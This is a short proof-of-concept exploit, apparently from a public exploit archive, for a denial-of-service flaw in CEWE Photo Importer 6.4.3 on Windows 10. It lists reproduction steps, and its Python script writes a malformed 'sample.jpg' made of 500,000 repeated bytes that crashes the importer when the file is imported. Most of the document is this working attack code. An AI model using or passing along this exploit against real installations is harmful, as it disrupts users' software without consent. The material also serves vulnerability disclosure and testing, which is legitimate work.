# -*- coding: utf-8 -*-
# Exploit Title: CEWE PHOTO IMPORTER 6.4.3 - Denial of Service (PoC)
# Date: 16/05/2019
# Author: Alejandra Sánchez
# Vendor Homepage: https://cewe-photoworld.com/
# Software: https://cewe-photoworld.com/creator-software/windows-download
# Version: 6.4.3
# Tested on: Windows 10

# Proof of Concept:
# 1.- Run the python script 'photoimporter.py',it will create a new file "sample.jpg"
# 2.- Open CEWE PHOTO IMPORTER
# 3.- Select the 'sample.jpg' file created and click 'Import all'
# 4.- Click 'Next' and 'Next', you will see a crash

buffer = "\x41" * 500000

f = open ("sample.jpg", "w")
f.write(buffer)
f.close()